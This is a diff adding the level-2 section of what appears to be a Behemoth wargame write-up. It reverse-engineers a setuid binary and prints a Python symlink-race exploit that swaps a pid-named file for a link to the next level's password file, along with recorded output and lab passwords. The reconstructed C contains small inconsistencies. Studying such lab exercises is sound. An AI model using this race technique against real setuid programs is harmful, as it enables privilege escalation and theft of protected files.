@@ -105,3 +105,37 @@ Verification: each password was accepted by logging in as the next level's accou
 - **Password for behemoth2:** `T27XOH3cbn`
 - **Verification:** logged in as `behemoth2` with this password (`whoami` → `behemoth2`).
 - **Recording:** `recordings/behemoth/L1.cast`
+
+## Level 2 → behemoth3
+- **Account:** `behemoth2`, password `T27XOH3cbn`.
+- **Goal:** No source is shipped for behemoth2, so the behaviour is recovered from `objdump`. In order:
+  ```c
+  sprintf(buf, "touch %d", getpid());      // buf is a local array
+  lstat(buf); unlink(buf);                 // remove a stale file with that name
+  setreuid(euid, euid); system(buf);       // touch <pid> in the CURRENT directory
+  sleep(2000);
+  sprintf(buf, "cat "); buf[4] = ' '; system(buf);   // cat <pid>, still as behemoth3
+  ```
+  The second `system()` runs after `setreuid`, so it executes as behemoth3 — and the file it cats is the one in the current directory, which we can change.
+- **Technique and why it works:** **pid-file race / symlink swap**. The program touches a file named after its own pid in the directory it was started from. If we start it inside a directory we own and watch for the numeric file to appear, we can `unlink` it and replace it with a symlink to `/etc/behemoth_pass/behemoth3`. When the program wakes after its 2000-second sleep and runs `cat <pid>` as behemoth3, the symlink resolves to the password file and the contents are printed to stdout.
+
+  The practical wrinkle is the wait: 2000 seconds is about 33 minutes, and the lab drops idle SSH sessions. The exploit therefore prints a heartbeat every 30 seconds so the session stays alive, and the recorder's wait budget is set accordingly.
+
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Recover the logic.** `strings` shows `touch %d` and `cat `; `objdump -d` shows `sprintf`, `lstat`, `unlink`, `setreuid(euid,euid)`, `system`, `sleep(0x7d0)`, then `sprintf(buf,"cat ")` with `buf[4]=' '` and another `system`.
+2. **Check the environment.** The home directory is not writable, and `/tmp` is sticky, so a file owned by behemoth3 cannot be unlinked there — hence a dedicated `/tmp/b2work` created and made world-writable.
+3. **Write the exploit in `vim /tmp/e_behemoth2.py`** (shown in full in the recording):
+   ```python
+   work = "/tmp/b2work"; os.makedirs(work, exist_ok=True); os.chmod(work, 0o777)
+   os.chdir(work)
+   p = subprocess.Popen(["/behemoth/behemoth2"])
+   # wait for the numeric pid file, then swap it for a symlink
+   os.unlink(target); os.symlink("/etc/behemoth_pass/behemoth3", target)
+   while p.poll() is None:          # heartbeat keeps ssh alive during sleep(2000)
+       print("alive", int(time.time()), flush=True); time.sleep(30)
+   ```
+4. **Run it.** The recording shows `pid: 74`, `pidfile: 74`, `replaced 74 -> /etc/behemoth_pass/behemoth3`, then ~33 minutes of `alive` lines, and finally `3gr7EdpaSr` and `B2DONE`.
+5. **Verify.** Log in as behemoth3 with that password (`whoami` → `behemoth3`).
+- **Password for behemoth3:** `3gr7EdpaSr`
+- **Verification:** logged in as `behemoth3` with this password.
+- **Recording:** `recordings/behemoth/L2.cast`
